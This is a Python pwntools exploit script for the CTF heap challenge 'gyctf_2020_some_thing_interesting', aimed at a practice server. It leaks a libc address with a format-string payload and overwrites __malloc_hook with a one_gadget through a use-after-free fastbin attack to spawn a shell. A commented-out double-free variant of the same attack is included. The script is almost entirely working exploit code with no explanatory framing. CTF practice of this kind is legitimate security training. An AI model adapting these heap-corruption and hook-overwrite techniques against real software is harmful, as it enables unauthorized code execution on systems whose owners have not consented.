from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, search_fun, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
		search_addr = base + libc.dump(search_fun)
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))
		search_addr = base + libc.sym[search_fun]

	return (base, system, binsh, search_addr)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './gyctf_2020_some_thing_interesting'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',27624) if argv[1]=='r' else process(binary)
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content,len2,content2):
    sla(b'> Now please tell me what you want to do :',b'1')
    sla(b'> O\'s length : ',int2bytes(len))
    sa(b'> O : ',content)
    sla(b'> RE\'s length : ',int2bytes(len2))
    sa(b'> RE : ',content2)


def show(index):
    sla(b'> Now please tell me what you want to do :',b'4')
    sla(b'> Oreo ID : ',int2bytes(index))

def edit(index,content,content2):
    sla(b'> Now please tell me what you want to do :',b'2')
    sla(b'> Oreo ID : ',int2bytes(index))
    sa(b'> O : ', content)
    sa(b'> RE : ', content2)

def delete(index):
    sla(b'> Now please tell me what you want to do :',b'3')
    sla(b'> Oreo ID : ',int2bytes(index))

fm_str = b'OreOOrereOOreO%17$p'
sa(b'> Input your code please:',fm_str)
sla(b'> Now please tell me what you want to do :',b'0')
ru(b'OreOOrereOOreO')
libc_start_main = int(bytes2int(r(14)),16) - 240

libc_base, _, _, malloc_hook = ret2libc(libc_start_main, '__libc_start_main','__malloc_hook','libc-2.23.so')
libc_base, _, _, realloc = ret2libc(libc_start_main, '__libc_start_main','realloc','libc-2.23.so')
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]

#纯uaf做法
add(0x68,b'a',0x68,b'b')#1--本题从1开始
delete(1)
# dbg()
edit(1, b'c', p64(malloc_hook - 0x23))
# dbg()
payload = b'a'*0x13 + p64(one_gadget[3] + libc_base)
add(0x68, p64(0), 0x68, payload)
# dbg()

sla(b'> Now please tell me what you want to do :', b'1')
sla(b'> O\'s length : ', int2bytes(0x20))
itr()


#double free做法
# add(0x68, b'a', 0x20, b'b')
# add(0x68, b'c', 0x20, b'd')
# delete(1)
# delete(2)
# delete(1)
# # dbg()
# add(0x68, p64(malloc_hook - 0x23), 0x68, p64(0))
# # dbg()
# add(0x68, p64(0), 0x68, b'a'*0x13 + p64(one_gadget[3] + libc_base))
# # dbg()
# sla(b'> Now please tell me what you want to do :', b'1')
# sla(b'> O\'s length : ', int2bytes(0x20))
# itr()